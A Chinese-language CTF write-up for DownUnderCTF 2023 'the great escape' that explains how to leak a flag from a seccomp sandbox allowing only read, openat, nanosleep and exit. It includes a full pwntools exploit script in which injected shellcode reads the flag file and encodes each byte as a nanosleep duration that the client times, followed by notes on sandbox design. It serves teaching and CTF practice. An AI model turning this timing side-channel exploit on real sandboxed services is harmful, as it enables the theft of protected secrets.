# DownUnderCTF 2023 the great escape Writeup

## 题目简述

程序把最多 127 字节输入放进 RWX 内存并直接执行，但随后启用 seccomp，只允许 `read`、`openat`、`nanosleep` 和 `exit`。可以读取 `/chal/flag.txt`，却不能调用 `write` 把内容发回客户端，因此需要利用时间侧信道逐字节泄漏。

## 解题过程

每次连接只恢复一个位置：用 `openat` 打开 flag，`read` 到栈上，再取第 $i$ 个字节 $v$。把休眠时间设置为：

$$
t=\left\lfloor\frac v{10}\right\rfloor
+\frac{v\bmod10}{10}\text{ 秒}=\frac v{10}\text{ 秒}.
$$

客户端测量从发送 shellcode 到连接关闭的时间，计算 `floor(elapsed * 10)` 即可恢复 ASCII 值。

```python
import math
import time
from pwn import *

context.arch = "amd64"

def shellcode_for(index):
    code = shellcraft.openat(-1, "/chal/flag.txt")
    code += shellcraft.read("rax", "rsp", 64)

    if index == 10:
        code += "mov rdx, 9; inc rdx;"
    else:
        code += f"mov rdx, {index};"

    code += """
        mov al, byte ptr [rsp + rdx]
        mov rbx, 10
        xor rdx, rdx
        div rbx
        mov rbx, rax
        mov rax, 100000000
        mul rdx
        push rax
        push rbx
    """
    code += shellcraft.nanosleep("rsp", 0)
    code += shellcraft.exit(0)
    return asm(code)

def leak(index):
    io = remote("host", 1337)
    io.recvuntil(b"> ")
    start = time.time()
    io.sendline(shellcode_for(index))
    io.recvall()
    return chr(math.floor((time.time() - start) * 10))

print("".join(leak(index) for index in range(44)))
```

索引 10 不能直接把立即数 `0x0a` 放进由 `fgets` 读取的 shellcode，否则会被当作换行截断，所以使用 `9` 后自增。恢复结果为：

```text
DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}
```

## 方法总结

seccomp 过滤了直接输出，却保留了依赖秘密值的可观察系统调用。`nanosleep` 的时长形成高带宽时间侧信道，`openat+read` 则负责把秘密载入内存。沙箱设计不仅要限制“能否读”和“能否写”，还要评估时间、退出状态和资源消耗等间接输出。
